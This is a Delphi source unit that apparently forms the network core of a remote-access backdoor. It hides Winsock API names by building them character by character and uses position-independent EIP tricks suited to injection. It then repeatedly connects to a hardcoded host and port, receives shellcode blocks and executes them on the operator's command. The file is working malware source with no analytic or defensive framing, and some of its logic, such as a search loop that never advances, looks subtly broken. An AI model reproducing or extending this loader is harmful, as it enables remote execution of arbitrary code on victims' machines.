unit untConnection;

interface
  
uses
  Windows,
  untUtils,
  winsock;

const
  CMD_ONLINE = 0;
  CMD_SHELLCODE_QUESTION = 1;
  CMD_SHELLCODE_NEW = 2;
  CMD_SHELLCODE_ADD = 3;
  CMD_SHELLCODE_CALL = 4;


procedure ConnectionLoop(pAPI:PAPIRec);
procedure ConnectionLoop_CALLER(pAPI:PAPIRec); stdcall;
procedure ConnectionLoop_END();

implementation

procedure ConnectionLoop_CALLER(pAPI:PAPIRec);stdcall;
begin
  ConnectionLoop(pAPI);
end;

function SendBuffer(pConn:PConnRec; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer; bCompress:Boolean): Boolean;
var
  lpszSendBuffer: Pointer;
  szSendBuffer: Pointer;
  pMem:Pointer;
  iSendLen: Integer;
begin
  Result := False;
  pMem := pConn.pAPI.xAllocMem(pConn.pAPI, 8192);
  if pMem <> nil then
  begin
    szSendBuffer := pMem;
    lpszSendBuffer := Pointer(DWORD(szSendBuffer) + SizeOf(TSocketHeader));
    if ((iBufferLen > 0) and (lpszBuffer <> nil)) then
    begin
      pConn.pAPI.xCopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
    end;
    with LPSocketHeader(szSendBuffer)^ do
    begin
      dwPacketLen := iBufferLen;
      bCommand := bySocketCmd;
    end;
    Dec(DWORD(lpszSendBuffer));
    iBufferLen := iBufferLen + SizeOf(TSocketHeader);
    iSendLen := pConn.xsend(pConn.hWinsock, szSendBuffer^, iBufferLen, 0);
    if (iSendLen = iBufferLen) then
      Result := True;
    pConn.pAPI.xFreeMem(pConn.pAPI, pMem);
  end;
end;

function RecvBuffer(pConn:PConnRec; lpszBuffer: PWideChar; iBufferLen: Integer): Integer; stdcall;
var
  lpTempBuffer: PWideChar;
begin
  Result := 0;
  pConn.pAPI.xZeroMemory(lpszBuffer^, iBufferLen);
  lpTempBuffer := lpszBuffer;
  while (iBufferLen > 0) do
  begin
    Result := pConn.xrecv(pConn.hWinsock, lpTempBuffer^, iBufferLen, 0);
    if (Result = SOCKET_ERROR) or (Result = 0) then
      break;
    lpTempBuffer := PWideChar(DWORD(lpTempBuffer) + DWORD(Result));
    iBufferLen := iBufferLen - Result;
  end;
end;

function SearchShellCode(pConn:PConnRec; dwID:Cardinal):PShellCodeRec;
var
  pLoop:PShellCodeRec;
begin
  Result := nil;
  pLoop := pConn.pShellCode;
  if pLoop = nil then
    exit;
  repeat
    if pLoop.dwID = dwID then
    begin
      Result := pLoop;
      break;
    end;
  until pLoop.nextShellCode = nil;
end;

procedure CallShellCode(pConn:PConnRec; pShell:PShellCode);
var
  pCallShell:PShellCodeRec;
  pCall:procedure(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;
begin
  pCallShell := SearchShellCode(pConn, pShell.dwID);
  if pCallShell <> nil then
  begin
    pCall := pCallShell.pShellCode;
    pCall(pConn, @(pShell.pData), pShell.dwLen);
  end;
end;

procedure AddShellCode(pConn:PConnRec; pShell:PShellCode; pData:Pointer);
var
  pNewShell:PShellCodeRec;
  pLoop:PShellCodeRec;
begin
  pNewShell := pConn.pAPI.xAllocMem(pConn.pAPI, pShell.dwLen);
  pNewShell.dwLen := pShell.dwLen;
  pNewShell.dwID := pShell.dwID;
  pNewShell.pReserved := nil;
  pNewShell.nextShellCode := nil;
  pNewShell.pShellCode := pConn.pAPI.xAllocMem(pConn.pAPI, pNewShell.dwLen);
  if pNewShell.pShellCode <> nil then
    CopyMemory(pNewShell.pShellCode, pData, pNewShell.dwLen);
  pNewShell.nextShellCode := pConn.pShellCode;

  pConn.pShellCode := pNewShell;
end;

function ParseShellCode(pConn:PConnRec; pData:Pointer; dwLen:Cardinal):PShellCode;
var
  pShell:PShellCode;
begin
  Result := pData;
  Result.pData := Pointer(DWORD(pData) + SizeOf(TShellCode) - SizeOf(Pointer));
end;


procedure ParsePacket(pConn:PConnRec; pBuffer:Pointer; dwLen:Cardinal; bCommand:Byte);
var
  pShell:PShellCode;
begin
  case bCommand of
    CMD_SHELLCODE_NEW: 
      begin
        pShell := pBuffer;
        AddShellCode(pConn, pShell, @(pShell.pData));
      end;
    CMD_SHELLCODE_CALL:
      begin
        pShell := pBuffer;
        CallShellCode(pConn, pShell);
      end;
  end;
end;

procedure ReceiveCommands(pConn:PConnRec);
var
  iResult: Integer;
  dwBufferLen: DWORD;
  bCommand:Byte;
  mRecvBuffer:Pointer;
  pPacketHeader:TSocketHeader;
begin
  mRecvBuffer := pConn.pAPI.xAllocMem(pConn.pAPI, 8192);
  if (mRecvBuffer <> nil) then
  begin
    while True do
    begin
      iResult := RecvBuffer(pConn, @pPacketHeader, SizeOf(pPacketHeader));
      if (iResult = 0) or (iResult = SOCKET_ERROR) then
        Break;
      if (pPacketHeader.dwPacketLen > 8192) then
        Break;
      //Get Data
      pConn.pAPI.xZeroMemory(mRecvBuffer^, 8192);
      iResult := RecvBuffer(pConn, mRecvBuffer, pPacketHeader.dwPacketLen);
      if (iResult = 0) or (iResult = SOCKET_ERROR) then
      begin
        Break;
      end;
      //Parse Packet
      ParsePacket(pConn, mRecvBuffer, iResult, pPacketHeader.bCommand);
    end;
    pConn.pAPI.xFreeMem(pConn.pAPI, mRecvBuffer);
  end;
end;

function ConnectToHost(pConn:PConnRec; pAddress:PChar; dwPort:Integer):Integer;
var
  SockAddrIn: TSockAddrIn;
  HostEnt: PHostEnt;
begin
  Result := pConn.xsocket(AF_INET, SOCK_STREAM, 0);
  If Result <> INVALID_SOCKET then begin
    SockAddrIn.sin_family := AF_INET;
    SockAddrIn.sin_port := pConn.xhtons(dwPort);
    SockAddrIn.sin_addr.s_addr := pConn.xinet_addr(pAddress);
    if SockAddrIn.sin_addr.s_addr = INADDR_NONE then
    begin
      HostEnt := pConn.xgethostbyname(pAddress);
      if HostEnt <> nil then
        SockAddrIn.sin_addr.s_addr := Longint(PLongint(HostEnt^.h_addr_list^)^)
      else
      begin
        Result := INVALID_SOCKET;
        Exit;
      end;
    end;
    if pConn.xconnect(Result, SockAddrIn, SizeOf(SockAddrIn)) <> S_OK then
      Result := INVALID_SOCKET;
  end;
end;

procedure LoadHelpers(pConn:PConnRec);stdcall;
var
  dwStaticAddress:Cardinal;
  dwLoadHelpers:Cardinal;
  dwEIP:Cardinal;
  dwRelativeAddress:Cardinal;
begin
  asm
    call @getEIP
    @getEIP:
    pop eax
    mov dwEIP, eax
  end;
  dwEIP := dwEIP - 11;
  dwLoadHelpers := DWORD(@LoadHelpers);

  dwStaticAddress := DWORD(@SendBuffer);
  dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
  pConn.xSendBuffer := Pointer(dwRelativeAddress);
end;


function ResolveWinsockAPI(pAPI:PAPIRec):PConnRec;
var
  strWinsock:Array[0..11] of Char;
  strWSAStartup:Array[0..10] of AnsiChar;
  strsocket:Array[0..6] of AnsiChar;
  strhtons:Array[0..5] of AnsiChar;
  strinetaddr:Array[0..9] of AnsiChar;
  strgethostbyname:Array[0..13] of AnsiChar;
  strconnect:Array[0..7] of AnsiChar;
  strsend, strrecv:Array[0..4] of AnsiChar;
begin
  strWinsock[0]:='w';strWinsock[1]:='s';strWinsock[2]:='o';strWinsock[3]:='c';strWinsock[4]:='k';strWinsock[5]:='3';strWinsock[6]:='2';strWinsock[7]:='.';strWinsock[8]:='d';strWinsock[9]:='l';strWinsock[10]:='l';strWinsock[11]:=#0;
  strWSAStartup[0]:='W';strWSAStartup[1]:='S';strWSAStartup[2]:='A';strWSAStartup[3]:='S';strWSAStartup[4]:='t';strWSAStartup[5]:='a';strWSAStartup[6]:='r';strWSAStartup[7]:='t';strWSAStartup[8]:='u';strWSAStartup[9]:='p';strWSAStartup[10]:=#0;
  strsocket[0]:='s';strsocket[1]:='o';strsocket[2]:='c';strsocket[3]:='k';strsocket[4]:='e';strsocket[5]:='t';strsocket[6]:=#0;
  strhtons[0]:='h';strhtons[1]:='t';strhtons[2]:='o';strhtons[3]:='n';strhtons[4]:='s';strhtons[5]:=#0;
  strinetaddr[0]:='i';strinetaddr[1]:='n';strinetaddr[2]:='e';strinetaddr[3]:='t';strinetaddr[4]:='_';strinetaddr[5]:='a';strinetaddr[6]:='d';strinetaddr[7]:='d';strinetaddr[8]:='r';strinetaddr[9]:=#0;
  strgethostbyname[0]:='g';strgethostbyname[1]:='e';strgethostbyname[2]:='t';strgethostbyname[3]:='h';strgethostbyname[4]:='o';strgethostbyname[5]:='s';strgethostbyname[6]:='t';strgethostbyname[7]:='b';strgethostbyname[8]:='y';strgethostbyname[9]:='n';strgethostbyname[10]:='a';strgethostbyname[11]:='m';strgethostbyname[12]:='e';strgethostbyname[13]:=#0;
  strconnect[0]:='c';strconnect[1]:='o';strconnect[2]:='n';strconnect[3]:='n';strconnect[4]:='e';strconnect[5]:='c';strconnect[6]:='t';strconnect[7]:=#0;
  strsend[0]:='s';strsend[1]:='e';strsend[2]:='n';strsend[3]:='d';strsend[4]:=#0;
  strrecv[0]:='r';strrecv[1]:='e';strrecv[2]:='c';strrecv[3]:='v';strrecv[4]:=#0;
  Result := pAPI.xAllocMem(pAPI, SizeOf(TConnRec));
  if Result <> nil then
  begin
    Result.pAPI := pAPI;
    Result.hWinsock := pAPI.xLoadLibraryW(@strWinsock[0]);
    Result.xWSAStartup := pAPI.xGetProcAddress(Result.hWinsock, @strWSAStartup[0]);
    Result.xsocket := pAPI.xGetProcAddress(Result.hWinsock, @strsocket[0]);
    Result.xhtons := pAPI.xGetProcAddress(Result.hWinsock, @strhtons[0]);
    Result.xinet_addr := pAPI.xGetProcAddress(Result.hWinsock, @strinetaddr[0]);
    Result.xgethostbyname := pAPI.xGetProcAddress(Result.hWinsock, @strgethostbyname[0]);
    Result.xconnect := pAPI.xGetProcAddress(Result.hWinsock, @strconnect[0]);
    Result.xsend := pAPI.xGetProcAddress(Result.hWinsock, @strsend[0]);
    Result.xrecv := pAPI.xGetProcAddress(Result.hWinsock, @strrecv[0]);
    LoadHelpers(Result);
  end;
end;

procedure ConnectionLoop(pAPI:PAPIRec);
var
  WSAData:TWSAData;
  pConn:PConnRec;
  strHost:Array[0..20] of ansiChar;
begin
  strHost[0]:='1';strHost[1]:='2';strHost[2]:='7';strHost[3]:='.';strHost[4]:='0';strHost[5]:='.';strHost[6]:='0';strHost[7]:='.';strHost[8]:='1';strHost[9]:=#0;
  pConn := ResolveWinsockAPI(pAPI);
  if pConn <> nil then
  begin
    pConn.xWSAStartUp($202, WSAData);
    while True do
    begin
      pConn.hWinsock := ConnectToHost(pConn, @strHost[0], 1515);
      if pConn.hWinsock <> INVALID_SOCKET then
      begin
        ReceiveCommands(pConn);
      end;
      CloseSocket(pConn.hWinsock);
      Sleep(20000);
    end;
    pAPI.xFreeMem(pAPI, pConn);
  end;
end;

procedure ConnectionLoop_END();asm end;

end.
